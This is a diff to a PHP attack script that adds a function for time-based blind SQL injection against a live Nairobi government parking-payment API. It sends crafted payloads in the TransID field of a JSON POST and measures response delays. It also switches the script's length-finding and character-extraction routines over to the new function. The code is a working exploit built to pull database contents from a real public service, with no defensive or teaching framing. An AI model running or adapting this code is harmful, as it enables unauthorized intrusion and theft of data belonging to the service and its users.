@@ -1249,6 +1249,101 @@ function nrs_d($injection, $i, $sleep_timer, $state)
     // ...
 }
 
+function nrs_e($injection, $i, $sleep_timer, $state)
+{
+   // $injection = str_replace(' ', ' ', $injection);
+    $sleep_a = $sleep_timer + 1;
+    $sleep_b = $sleep_a * 1000;
+    $injk = "SB5662FDXC'+".$injection."+'";
+    //echo $injk.'<br/>';
+    // $curl = curl_init();
+    global $curl;
+    curl_setopt_array($curl, array(
+        CURLOPT_URL => 'https://nairobiservices.go.ke/api/parking/parking/confirm_payment',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => $sleep_a, // Set the cURL timeout to 5 seconds
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+        CURLOPT_CUSTOMREQUEST => 'POST',
+        CURLOPT_POSTFIELDS => '{
+        "mpesadetails": {
+        "FirstName": "John",
+        "BillRefNumber": "BL-FH-00044",
+        "TransAmount": "1000.0",
+        "BillType": "FoodHandling",
+        "TransChannel": "mpesa",
+        "TransID": "'.$injk.'"
+         }
+        }',
+        CURLOPT_HTTPHEADER => array(
+            'Content-Type: application/json',
+        ),
+    ));
+
+    // Set the cURL timeout
+    curl_setopt($curl, CURLOPT_TIMEOUT_MS, $sleep_b);
+
+    // Execute the cURL request
+    $response = curl_exec($curl);
+    //echo $response.'<br/>';
+
+    // Check for cURL errors and the execution time
+    $curlError = curl_error($curl);
+    $curlInfo = curl_getinfo($curl);
+    //echo $response;
+    // Close the cURL session
+    curl_close($curl);
+
+    $i = [
+        'message' => $i,
+    ];
+    // Check if the request timed out
+    if ($curlInfo['total_time'] >= $sleep_a) {
+        if ($state['id'] == 1) {
+            echo "result:" . $i['message'];
+            exit; // Terminate the script
+        } elseif ($state['id'] == 2) {
+            if (is_array($i)) {
+
+                $stateObject = base64_encode(json_encode($state));
+
+                if (!isset($state['statecode'])) {
+                    $stateCode = base64_encode(json_encode([$i['message']]));
+                } else {
+                    $stc_a = json_decode(base64_decode($state['statecode']), true);
+                    //$stc_a['statecode']
+                    array_push($stc_a, $i['message']);
+                    $stateCode = base64_encode(json_encode($stc_a));
+                    //$state['stateCode'] = '';
+                }
+                sql_verif($stateCode, $stateObject);
+
+                exit('The script touched exit!'); // Terminate the script
+            } else {
+                echo "Variable [i] should be an array with state 2!";
+                exit; // Terminate the script
+            }
+        } else {
+            echo "Unknown variable [i].Should be either 1[a string] or 2[an array]!";
+            exit; // Terminate the script
+        }
+    } else {
+        //echo "Script ended. Last parameter: " . $i.'<BR/>'.PHP_EOL;
+       // echo "Script ended. Last parameter: " . ''.'<BR/>'.PHP_EOL;
+    }
+
+    // Handle other possible errors or process the response as needed
+    if ($curlError) {
+        echo "cURL Error: " . $curlError;
+        exit; // Terminate the script
+    }
+
+    // Process the response as needed
+    // ...
+}
+
 function length_finder($sleep_timer, $target, $parameter, $state)
 {
     for ($i = 0; $i <= 200; $i++) {
@@ -1262,7 +1357,7 @@ function length_finder($sleep_timer, $target, $parameter, $state)
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
         } elseif ($target == 3) {
-            $result = nrs_d($injection, $i, $sleep_timer, $state);
+            $result = nrs_e($injection, $i, $sleep_timer, $state);
         }
     }
     return $result;
@@ -1302,7 +1397,7 @@ function count_checker($sleep_timer, $target, $query, $i, $hex, $state)
     } elseif ($target == 2) {
         $result = kotnova($injection, $i, $sleep_timer, $state);
     } elseif ($target == 3) {
-        $result = nrs_d($injection, $i, $sleep_timer, $state);
+        $result = nrs_e($injection, $i, $sleep_timer, $state);
     }
 
     if ($result == '' || $result = null) {
@@ -1322,7 +1417,7 @@ function cr_1($position, $parameter, $target, $sleep_timer, $state)
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
         } elseif ($target == 3) {
-            $result = nrs_d($injection, $i, $sleep_timer, $state);
+            $result = nrs_e($injection, $i, $sleep_timer, $state);
         }
     }
     if ($result == '' || $result == null) {
@@ -1342,7 +1437,7 @@ function cr_2($position, $parameter, $target, $sleep_timer, $state)
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
         } elseif ($target == 3) {
-            $result = nrs_d($injection, $i, $sleep_timer, $state);
+            $result = nrs_e($injection, $i, $sleep_timer, $state);
         }
     }
     if ($result == '' || $result == null) {
@@ -1362,7 +1457,7 @@ function cr_3($position, $parameter, $target, $sleep_timer, $state)
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
         } elseif ($target == 3) {
-            $result = nrs_d($injection, $i, $sleep_timer, $state);
+            $result = nrs_e($injection, $i, $sleep_timer, $state);
         }
     }
     if ($result == '' || $result == null) {
@@ -1384,7 +1479,7 @@ function cr_4($position, $parameter, $target, $sleep_timer, $state)
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
         } elseif ($target == 3) {
-            $result = nrs_d($injection, $i, $sleep_timer, $state);
+            $result = nrs_e($injection, $i, $sleep_timer, $state);
         }
         if ($result == '' || $result == null) {
             return 'NO';
@@ -1406,7 +1501,7 @@ function cr_5($position, $parameter, $target, $sleep_timer, $state)
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
         } elseif ($target == 3) {
-            $result = nrs_d($injection, $i, $sleep_timer, $state);
+            $result = nrs_e($injection, $i, $sleep_timer, $state);
         }
         if ($result == '' || $result == null) {
             return 'NO';
@@ -1427,7 +1522,7 @@ function cr_6($position, $parameter, $target, $sleep_timer, $state)
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
         } elseif ($target == 3) {
-            $result = nrs_d($injection, $i, $sleep_timer, $state);
+            $result = nrs_e($injection, $i, $sleep_timer, $state);
         }
     }
     if ($result == '' || $result == null) {
@@ -1447,7 +1542,7 @@ function cr_7($position, $parameter, $target, $sleep_timer, $state)
         } elseif ($target == 2) {
             $result = kotnova($injection, $i, $sleep_timer, $state);
         } elseif ($target == 3) {
-            $result = nrs_d($injection, $i, $sleep_timer, $state);
+            $result = nrs_e($injection, $i, $sleep_timer, $state);
         }
     }
     if ($result == '' || $result == null) {
